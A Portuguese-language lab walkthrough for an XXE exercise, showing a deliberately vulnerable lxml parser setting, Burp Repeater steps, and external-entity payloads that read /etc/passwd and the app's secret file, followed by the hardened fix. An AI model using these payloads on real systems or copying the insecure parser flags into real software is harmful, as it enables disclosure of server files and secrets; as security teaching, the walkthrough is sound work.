# Walkthrough — xxe-basic

A app importa um contato de um documento XML e te mostra o nome importado. Um documento XML pode carregar um **DTD** (Document Type Definition) — um preâmbulo opcional que, entre outras coisas, permite declarar **entities**: atalhos nomeados que o parser expande, como variáveis. Uma entity pode ser _external_, apontando pra uma URI como um arquivo no servidor (`file:///etc/passwd`). Se o parser a resolve, o conteúdo do arquivo expande no documento e volta no "nome" importado. Você vai ler o `/etc/passwd`, depois o segredo da própria app.

## 1. Contexto

A app expõe um "Contact Importer". Em `/` você recebe um form com um `<textarea>` pré-preenchido com um cartão de contato benigno. Submeter dispara `POST /import` com um campo de form `xml=<o documento>`; o servidor parseia o XML com `lxml`, extrai o elemento `<name>`, e renderiza `Imported contact: <name>`.

O parser é construído pra resolver **external entities**. Essa única config é o bug inteiro — a lógica de importação, no mais, é comum. Isto é XML External Entity (XXE) injection, sob A05 — Security Misconfiguration: a causa-raiz é uma config perigosa do parser, não um bug de lógica.

Não há banco nem segundo serviço — só a app `vulnerable` em `127.0.0.1:8018` e a `fixed` em `127.0.0.1:8118`. A trilha principal é o Burp.

## 2. Ache o bug

Abra [`vulnerable/app.py`](./vulnerable/app.py). A view `/import` parseia assim:

```python
xml = request.form.get("xml", "")
# VULNERABLE: parse untrusted XML with a parser that RESOLVES EXTERNAL ENTITIES
parser = etree.XMLParser(resolve_entities=True, load_dtd=True, no_network=True)  # dangerous
doc = etree.fromstring(xml.encode("utf-8"), parser)
name = doc.findtext("name") or ""
```

`resolve_entities=True` manda o `lxml` expandir entities, e `load_dtd=True` deixa ele processar o `DOCTYPE`. Juntos: se o seu documento declara uma external entity `SYSTEM`, o parser busca o que ela aponta e substitui o conteúdo no lugar. Aponte pra uma URL `file://` e o parser lê aquele arquivo. Pergunta de auditoria: *o parser resolve uma entity que EU declaro dentro do documento, inclusive uma apontando pra um arquivo do servidor?* — sim. O `no_network=True` mantém tudo em arquivos locais (não na rede), e é por isso que isto é arbitrary file disclosure, não SSRF.

## 3. Exploração via Burp Suite (trilha principal)

Configure o Burp Proxy e aponte seu browser pra ele. Visite <http://127.0.0.1:8018/>, submeta o form pré-preenchido uma vez pra capturar o tráfego, depois clique com o botão direito no request `POST /import` em **Proxy → HTTP history** e escolha **Send to Repeater**.

O request de baseline capturado é assim — um post de form HTML, então o corpo é um único campo `xml=` URL-encoded:

```
POST /import HTTP/1.1
Host: 127.0.0.1:8018
Content-Type: application/x-www-form-urlencoded
Content-Length: 121

xml=%3Ccontact%3E%0A++%3Cname%3EAda+Lovelace%3C%2Fname%3E%0A++%3Cemail%3Eada%40example.com%3C%2Femail%3E%0A%3C%2Fcontact%3E
```

### Uma nota sobre encoding do corpo

O corpo é `application/x-www-form-urlencoded`, e esse formato tem uma armadilha que pega todo mundo uma vez: **`&` separa campos.** Seu payload de XXE usa `&x;` pra referenciar a entity — se você colar cru, o `&` inicia um novo campo de form e o servidor nunca vê a sua referência de entity. Então o **valor** inteiro de `xml=` precisa ser URL-encoded: `<` → `%3C`, `>` → `%3E`, `"` → `%22`, e crucialmente `&` → `%26`.

O jeito fácil no Repeater: cole o XML decodado depois de `xml=`, selecione só esse valor, e aperte **Ctrl+U**. O Burp URL-encoda a seleção — espaços, angle brackets, aspas, e o `&` decisivo. Cada passo abaixo mostra o **payload decodado** (pra leitura); encode antes de enviar.

### Passo 1 — Baseline: a feature funciona

Payload (o cartão pré-preenchido):

```xml
<contact>
  <name>Ada Lovelace</name>
  <email>ada@example.com</email>
</contact>
```

Resposta:

```
Imported contact:
Ada Lovelace
```

O importador lê o `<name>` e ecoa. Feature normal, funcionando como esperado.

### Passo 2 — Ler o /etc/passwd

Adicione um `DOCTYPE` que declara uma external entity, e use ela dentro do `<name>`:

```xml
<!DOCTYPE contact [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<contact><name>&x;</name></contact>
```

Encode o valor (lembre `&` → `%26`) e envie. Resposta:

```
Imported contact:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
...
```

A entity `&x;` expandiu pro conteúdo do `/etc/passwd`, e a app ecoou como o "nome" do contato. Essa é a prova: o seu documento fez o servidor ler um arquivo e devolver. O `/etc/passwd` é a primeira leitura clássica — world-readable, sempre presente, e não é segredo em si (os password hashes ficam no `/etc/shadow`, que o processo da app não consegue ler).

### Passo 3 — Ler o segredo da própria app (clímax)

Mesmo payload, aponte a entity pro arquivo da própria app:

```xml
<!DOCTYPE contact [<!ENTITY x SYSTEM "file:///app/secret.txt">]>
<contact><name>&x;</name></contact>
```

Resposta:

```
Imported contact:
APP_API_KEY=FLAG-xxe-9f1c2a-EXAMPLE-not-a-real-secret
```

Isso é um arquivo que a aplicação plantou pra si mesma e jamais pretendeu expor. Qualquer arquivo que o processo da app consiga ler — configs, código-fonte, chaves — agora é legível pelo importador. (O valor aqui é um placeholder de lab obviamente falso, não um segredo real.)

## 4. O que a vuln NÃO é

O exploit é um documento, não uma string mágica, então é fácil tirar a lição errada. Isole a causa real:

- **NÃO é "processar XML é perigoso".** Parsear XML é normal. Resolver *external entities* é o bug. **Prova:** envie o cartão benigno do Passo 1 (sem `DOCTYPE`) pra app vulnerable **e** pra fixed — as duas retornam exatamente `Imported contact: Ada Lovelace`. A lógica de importação é idêntica nas duas. Só adicionar o `DOCTYPE` + entity separa uma da outra.
- **NÃO é um bug de lógica da app.** Nada na rota `/import` está errado — as duas versões parseiam e ecoam do mesmo jeito. A única diferença entre `vulnerable/` e `fixed/` é uma config do parser (resolver external entity vs não). Veja o [`DIFF.pt-BR.md`](./DIFF.pt-BR.md).
- **NÃO é SSRF.** Com `no_network=True` (o default do lxml), a entity lê um arquivo local (`file://`) e não alcança a rede. Aponte uma entity pra `http://…` e nada é buscado — o `name` volta vazio. Este átomo é file disclosure, não uma requisição server-side.
- **NÃO é XSS.** O conteúdo do arquivo volta **escapado**: um payload cujo nome é `<script>alert(1)</script>` renderiza como `&lt;script&gt;alert(1)&lt;/script&gt;` no source da página, não como uma tag viva. O bug é o parser ler o arquivo, não como o resultado é exibido.
- **NÃO é "a standard library é quebrada".** O `xml.etree.ElementTree` do Python não expandiria essa external entity de jeito nenhum — a vuln vive especificamente no parser `lxml` sendo instruído a resolver entities. É por isso que este átomo usa `lxml`; veja o DIFF.

A única coisa que a vuln **é**: o parser resolve uma entity que *você* declara, apontada pra um arquivo do servidor, e devolve o conteúdo. O único fix é parar de resolver external entities.

## 5. Impacto

**Arbitrary file disclosure.** O atacante lê qualquer arquivo que o processo da app consiga ler — `/etc/passwd`, o `secret.txt` da própria app, config, código-fonte, chaves. Esse é o finding aqui: disclosure, não execução de código. XXE é uma classe ampla com outras faces além da leitura de arquivo in-band, mas este átomo é uma leitura de arquivo in-band direta — sem overclaim, e sem remote code execution no servidor da app por si só.

## 6. Por que o fix funciona

Veja o [`DIFF.pt-BR.md`](./DIFF.pt-BR.md) pra mudança. A app fixed constrói o parser com as features perigosas **desligadas**:

```python
parser = etree.XMLParser(resolve_entities=False, load_dtd=False, no_network=True)  # hardened
```

Repita os Passos 2 e 3 contra <http://127.0.0.1:8118/import>. A entity `SYSTEM` nunca é resolvida, então o `<name>` não tem texto expandido e a resposta volta com o `name` **vazio**:

```
Imported contact:

```

Nenhum conteúdo de arquivo, pra nenhum dos payloads. O cartão benigno do Passo 1 ainda importa como `Ada Lovelace` — a feature está intacta; só a leitura de arquivo sumiu. O fix inteiro são aquelas duas flags desligadas. (`defusedxml` é o nome histórico que as pessoas buscam, mas o suporte a `lxml` nele está deprecado — endurecer o parser direto é o conselho atual. Veja o DIFF.)
